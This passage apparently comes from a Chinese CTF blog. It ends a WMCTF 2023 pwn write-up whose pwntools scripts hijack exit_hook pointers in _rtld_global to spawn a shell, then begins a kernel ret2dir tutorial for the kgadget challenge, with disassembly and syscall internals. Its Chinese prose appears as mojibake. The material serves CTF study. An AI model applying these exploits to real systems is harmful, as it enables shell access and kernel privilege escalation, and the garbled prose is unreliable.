*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res += <span class="string">b&#x27;.&#x27;</span> + p8(content[i]) + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># dbpie(&#x27;0x130E&#x27;)</span></span><br><span class="line">    <span class="comment"># dbpie(&#x27;0x001301&#x27;)</span></span><br><span class="line">    sla(<span class="string">b&#x27;ta size&#x27;</span>,<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">    code=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fe5e466f190</span>- <span class="number">0x7fe5e4357010</span>)+write(p32(<span class="number">0x3CB1</span>)[<span class="number">0</span>:<span class="number">2</span>])</span><br><span class="line">    code+=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7f30010c62a0</span>-<span class="number">0x7f30010c6190</span>-<span class="number">2</span>)+write(p64(<span class="number">0</span>))+<span class="string">b&#x27;q&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;code&#x27;</span>,code)</span><br><span class="line">    data=io.recvrepeat(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">      <span class="built_in">print</span>(data)</span><br><span class="line">      pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      io.close()</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    io.close()</span><br></pre></td></tr></table></figure><p><img src="/2023/08/28/2023wmctf/image-20230901010937493.png" alt="image-20230901010937493"></p><h2 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a><a href="https://www.cnblogs.com/pwnfeifei/p/15759130.html">exit_hook</a></h2><p>åŠ«æŒrtld_globalä¸­çš„å‡½æ•°æŒ‡é’ˆ(ä¸€èˆ¬æ—¶ä¸Šé”è§£é”çš„å‡½æ•°)ï¼Œè°ƒç”¨å…³ç³» exit()â€“&gt;__run_exit_handlersâ€“&gt;_dl_finiâ€“&gt;rtld_lock_default_lock_recursiveâ€“&gt;rtld_lock_default_unlock_recursive</p><p>å…¶ä¸­<code>rtld_lock_default_lock_recursive</code>å’Œ<code>rtld_lock_default_unlock_recursive</code>æ¥è‡ªäº<code>_rtld_global</code>ç»“æ„ä½“</p><p><img src="/2023/08/28/2023wmctf/image-20230830134733689.png" alt="image-20230830134733689"></p><p>å…¶ä¸­rtld_lock_default_lock_recursiveå’Œ<code>rtld_lock_default_unlock_recursive</code>è°ƒç”¨æ—¶å‚æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock))</span><br></pre></td></tr></table></figure><p><code>GL(dl_load_lock)</code>ä¹Ÿæ˜¯ä»<code>_rtld_global</code>é‡Œå–å‡ºæ¥çš„å€¼ï¼Œå³<code>_rtld_global._dl_load_lock.mutex</code>çš„åœ°å€</p><blockquote><p>libcå’Œldåç§»é€šå¸¸ç¬¬2å­—èŠ‚å¤„ä¸ä¸€æ ·ï¼Œ256ç§å¯èƒ½</p></blockquote><p>ä¸€ç§æ–¹æ³•å°±æ˜¯æ”¹<code>rtld_lock_default_lock_recursive</code>å’Œ<code>rtld_lock_default_unlock_recursive</code>å…¶ä¸­ä¸€ä¸ªä¸ºogg</p><p>æˆ–è€…æ”¹<code>rtld_lock_default_lock_recursive</code>å’Œ<code>rtld_lock_default_unlock_recursive</code>å…¶ä¸­ä¸€ä¸ªä¸ºsystemï¼Œæ”¹<code>_rtld_global._dl_load_lock.mutex</code>å¤„ä¸ºâ€œ&#x2F;bin&#x2F;sh\x00â€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res += <span class="string">b&#x27;.&#x27;</span> + p8(content[i]) + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment"># dbpie(&#x27;0x1301  &#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x01313&#x27;)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(pwnfile)</span><br><span class="line">        sla(<span class="string">b&#x27;ta size&#x27;</span>,<span class="string">b&#x27;1000000&#x27;</span>)</span><br><span class="line">        sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">        code=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fc4cf08c968</span>-<span class="number">0x7fc4ced75010</span>)+write(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        code+=<span class="string">b&#x27;@&#x27;</span>+p32(<span class="number">0x7fc4cf08cf60</span>-<span class="number">0x7fc4cf08c968</span>)+write(p32(<span class="number">0xb6e290</span>)[<span class="number">0</span>:<span class="number">3</span>])+<span class="string">b&#x27;q&#x27;</span></span><br><span class="line">        sla(<span class="string">b&#x27;code&#x27;</span>,code)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        sl(<span class="string">b&#x27;cat /flag&#x27;</span>)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><strong>å…³äºexitçš„åˆ©ç”¨ï¼š<a href="https://www.anquanke.com/post/id/243196">https://www.anquanke.com/post/id/243196</a></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Ret2dir</title>
      <link href="/2023/08/22/kernel-ret2dir/"/>
      <url>/2023/08/22/kernel-ret2dir/</url>
      
        <content type="html"><![CDATA[<h1 id="return-to-direct-mapped-memory"><a href="#return-to-direct-mapped-memory" class="headerlink" title="return to direct-mapped memory"></a>return to direct-mapped memory</h1><p>ç»•è¿‡smep smapä¿æŠ¤ç­‰ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´éš”ç¦»çš„é˜²æŠ¤æ‰‹æ®µ</p><p>æŸ¥çœ‹linux x86è™šæ‹Ÿå†…å­˜å¸ƒå±€ <a href="https://elixir.bootlin.com/linux/v5.19.17/source/Documentation/x86/x86_64/mm.rst">https://elixir.bootlin.com/linux/v5.19.17/source/Documentation/x86/x86_64/mm.rst</a></p><p>é‡Œé¢å­˜åœ¨ä¸€å—direct mapping of all physical memoryçš„è™šæ‹Ÿå†…å­˜<strong>çº¿æ€§åœ°ç›´æ¥æ˜ å°„äº†æ•´ä¸ªæˆ–éƒ¨åˆ†ç‰©ç†å†…å­˜ç©ºé—´</strong>ï¼Œè¿™å—åŒºåŸŸä¹Ÿå«<strong>physmap</strong></p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820153202390.png" alt="image-20230820153202390"></p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820102303460.png" alt="image-20230820102303460"></p><p>Linuxåœ¨x86-64æ¶æ„æ˜¯ç›´æ¥æ˜ å°„äº†æ•´ä¸ªç‰©ç†å†…å­˜åˆ°è¿™å—åŒºåŸŸ(ä¸Šé¢å›¾ç‰‡æ˜¯48ä½è™šæ‹Ÿå†…å­˜4çº§é¡µè¡¨çš„æƒ…å†µ)ï¼Œæ‰€æœ‰å°±å¯ä»¥åˆ©ç”¨è¿™å—åŒºåŸŸè®¿é—®åˆ°åœ¨ç”¨æˆ·ç©ºé—´å¸ƒç½®çš„ä¸€äº›payloadï¼Œæ–°ç‰ˆæœ¬è¿™å—ç›´æ¥æ˜ å°„åŒºæ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œåªèƒ½rop</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820154114405.png" alt="image-20230820154114405"></p><h2 id="MINI-LCTF2022-kgadget"><a href="#MINI-LCTF2022-kgadget" class="headerlink" title="MINI-LCTF2022 - kgadget"></a><a href="https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz">MINI-LCTF2022 - kgadget</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/kgadget&gt; file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 5.10.112 (arttnba3@ubuntu) #1 SMP Thu Apr 21 19:47:35 +08 2022, RO-rootFS, swap_dev 0X9, Normal VGA</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/k/rootfs&gt; cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/kgadget&gt; checksec kgadget.ko</span><br><span class="line">[*] &#x27;/home/grxer/kernel-env/kgadget/kgadget.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>initè„šæœ¬é‡Œé™åˆ¶äº†demsgå’Œ&#x2F;proc&#x2F;kallsystem</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/kernel/kptr_restrict</span><br></pre></td></tr></table></figure><p>run.shå¼€äº†smep smap kptiï¼Œæ²¡å¼€kaslrï¼Œå¯ä»¥é€šè¿‡vmlinuxè·å–å‡½æ•°åœ°å€å’Œgadgetä½ç½®</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ç»™vmlinuxéœ€è¦ä»bzImageé‡Œæ¢å¤,ä¸¤ç§æ–¹æ³•</p><ul><li>extract-vmlinux psï¼šè¿™é“é¢˜ç”¨è¿™ä¸ªæ²¡æ¢å¤å‡ºæ¥ç¬¦å·è¡¨</li><li>vmlinux-to-elf</li></ul><p>file_operationsç»“æ„ä½“é‡Œé‡å†™äº†ä¸‹é¢çš„å‡½æ•°</p><p><img src="/2023/08/22/kernel-ret2dir/image-20230820170432061.png" alt="image-20230820170432061"></p><p>ioctlå‡½æ•°ä¼ªä»£ç ä¸å¤ªå¥½çœ‹ï¼Œç›´æ¥çœ‹æ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">text.unlikely:<span class="number">00000000000000F</span>3                               ; __int64 __fastcall <span class="title function_">kgadget_ioctl</span><span class="params">(file *__file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 param)</span></span><br><span class="line">.text.unlikely:00000000000000F3                               kgadget_ioctl proc near                 ; DATA XREF: __mcount_loc:<span class="number">0000000000000653</span>â†“o</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                                                                       ; .data:kgadget_foâ†“o</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               regs_addr= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               __file = rdi                            ; file *</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               cmd = rsi                               ; <span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3                               param = rdx                             ; <span class="type">unsigned</span> __int64</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3 E8 <span class="number">40</span> <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    __fentry__                      ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>3</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>8 <span class="number">55</span>                            push    rbp</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>9 <span class="number">48</span> <span class="number">89</span> E5                      mov     rbp, rsp</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>C <span class="number">53</span>                            push    rbx</span><br><span class="line">.text.unlikely:<span class="number">00000000000000F</span>D <span class="number">48</span> <span class="number">83</span> EC <span class="number">10</span>                   sub     rsp, <span class="number">10</span>h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000101</span> <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    mov     rax, gs:<span class="number">28</span>h</span><br><span class="line">.text.unlikely:<span class="number">000000000000010</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">45</span> F0                   mov     [rbp<span class="number">-10</span>h], rax</span><br><span class="line">.text.unlikely:<span class="number">000000000000010</span>E <span class="number">31</span> C0                         xor     eax, eax</span><br><span class="line">.text.unlikely:<span class="number">0000000000000110</span> <span class="number">81</span> FE <span class="number">52</span> BF <span class="number">01</span> <span class="number">00</span>             cmp     esi, <span class="number">1B</span>F52h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000116</span> <span class="number">0F</span> <span class="number">85</span> <span class="number">87</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jnz     loc_1A3</span><br><span class="line">.text.unlikely:<span class="number">0000000000000116</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000011</span>C <span class="number">48</span> <span class="number">8B</span> <span class="number">1</span>A                      mov     rbx, [param]</span><br><span class="line">.text.unlikely:<span class="number">000000000000011F</span>                               kgadget_ptr = rbx                       ; <span class="type">void</span> (*)(<span class="type">void</span>)</span><br><span class="line">.text.unlikely:<span class="number">000000000000011F</span> <span class="number">48</span> C7 C7 <span class="number">70</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     __file, offset unk_370</span><br><span class="line">.text.unlikely:<span class="number">0000000000000126</span> <span class="number">48</span> <span class="number">89</span> DE                      mov     cmd, kgadget_ptr</span><br><span class="line">.text.unlikely:<span class="number">0000000000000129</span> E8 <span class="number">2</span>A <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000129</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000012</span>E <span class="number">48</span> C7 C7 A0 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     rdi, offset unk_3A0</span><br><span class="line">.text.unlikely:<span class="number">0000000000000135</span> E8 <span class="number">1</span>E <span class="number">0F</span> <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000135</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000013</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">65</span> E8                   mov     [rbp<span class="number">-18</span>h], rsp</span><br><span class="line">.text.unlikely:<span class="number">000000000000013</span>E <span class="number">48</span> <span class="number">8B</span> <span class="number">45</span> E8                   mov     rax, [rbp<span class="number">-18</span>h]</span><br><span class="line">.text.unlikely:<span class="number">0000000000000142</span> <span class="number">48</span> C7 C7 F8 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          mov     rdi, offset unk_3F8</span><br><span class="line">.text.unlikely:<span class="number">0000000000000149</span> <span class="number">48</span> <span class="number">05</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span>             add     rax, <span class="number">1000</span>h</span><br><span class="line">.text.unlikely:<span class="number">000000000000014F</span> <span class="number">48</span> <span class="number">25</span> <span class="number">00</span> F0 FF FF             and     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text.unlikely:<span class="number">0000000000000155</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">90</span> <span class="number">58</span> FF FF FF          lea     rdx, [rax<span class="number">-0</span>A8h]</span><br><span class="line">.text.unlikely:<span class="number">000000000000015</span>C <span class="number">48</span> <span class="number">89</span> <span class="number">55</span> E8                   mov     [rbp<span class="number">-18</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000160</span>                               regs = rdx                              ; pt_regs *</span><br><span class="line">.text.unlikely:<span class="number">0000000000000160</span> <span class="number">48</span> BA <span class="number">61</span> <span class="number">72</span> <span class="number">74</span> <span class="number">74</span> <span class="number">6</span>E <span class="number">62</span> <span class="number">61</span> <span class="number">33</span> mov     regs, <span class="string">&#x27;3abnttra&#x27;</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000016</span>A <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">58</span> FF FF FF          mov     [rax<span class="number">-0</span>A8h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000171</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">60</span> FF FF FF          mov     [rax<span class="number">-0</span>A0h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000178</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">68</span> FF FF FF          mov     [rax<span class="number">-98</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">000000000000017F</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">70</span> FF FF FF          mov     [rax<span class="number">-90</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000186</span> <span class="number">48</span> <span class="number">89</span> <span class="number">90</span> <span class="number">78</span> FF FF FF          mov     [rax<span class="number">-88</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">000000000000018</span>D <span class="number">48</span> <span class="number">89</span> <span class="number">50</span> <span class="number">80</span>                   mov     [rax<span class="number">-80</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000191</span> <span class="number">48</span> <span class="number">89</span> <span class="number">50</span> <span class="number">90</span>                   mov     [rax<span class="number">-70</span>h], rdx</span><br><span class="line">.text.unlikely:<span class="number">0000000000000195</span> E8 BE <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span>                call    printk                          ; PIC mode</span><br><span class="line">.text.unlikely:<span class="number">0000000000000195</span></span><br><span class="line">.text.unlikely:<span class="number">000000000000019</span>A E8 B1 <span class="number">0</span>E <span class="number">00</span> <span class="number">00</span>                call    __x86_indirect_thunk_rbx        ; PIC mode</span><br></pre></td></tr></table></figure><p>ä¼šæŠŠioctlç¬¬ä¸‰ä¸ªå‚æ•°é‡Œçš„å€¼å½“ä½œå‡½æ•°æŒ‡é’ˆå»è°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç”¨æˆ·æ€å¸ƒç½®ææƒropé“¾ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥åœ¨å†…æ ¸æ€ä»çº¿æ€§æ˜ å°„åŒºé‚£é‡Œè®¿é—®åˆ°å˜›ï¼Œåˆ©ç”¨mmapç”³è¯·ä¸”å¸ƒç½®å¾ˆå¤šgadgetå†…æ ¸è®¿é—®åˆ°çš„æœºç‡å°±å¤§çš„å¤š</p><blockquote><p>å¯ä»¥mmapç”³è¯·åï¼Œgdbé‡Œç”¨findå‘½ä»¤å»æ‰¾ä¸‹ï¼ŒéªŒè¯ä¸‹å†…æ ¸è®¿é—®</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find 0xffff888000000000,+0x10000000,&quot;target strings&quot;</span><br></pre></td></tr></table></figure></blockquote><p>ç°åœ¨éœ€è¦è§£å†³çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ€ä¹ˆæŠŠæ ˆè¿ç§»åˆ°å¯ä»¥è®¿é—®åˆ°ç”¨æˆ·æ€çš„çº¿æ€§æ˜ å°„åŒº?</p><p><strong>å…ˆäº†è§£ä¸‹ä¸€ç‚¹æ²¡å¼€kpitæ—¶çš„syscall(å¼€äº†pitè¿˜éœ€è¦åˆ‡æ¢cr3ï¼Œæ¢é¡µè¡¨)</strong></p><p>syscallä¼šæŠŠsyscallçš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å³ripä¿å­˜åˆ°rcxï¼Œrflagsä¿å­˜åˆ° r11ä¸­ï¼Œåæ‰§è¡Œåˆ°entry_SYSCALL_64 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"> <span class="comment">/* SWAPGS_UNSAFE_STACKæ˜¯ä¸€ä¸ªå®ï¼Œx86ç›´æ¥å®šä¹‰ä¸ºswapgsæŒ‡ä»¤ */</span></span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ä¿å­˜æ ˆå€¼ï¼Œå¹¶è®¾ç½®å†…æ ¸æ ˆ */</span></span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* é€šè¿‡pushä¿å­˜å¯„å­˜å™¨å€¼ï¼Œå½¢æˆä¸€ä¸ªpt_regsç»“æ„ */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span 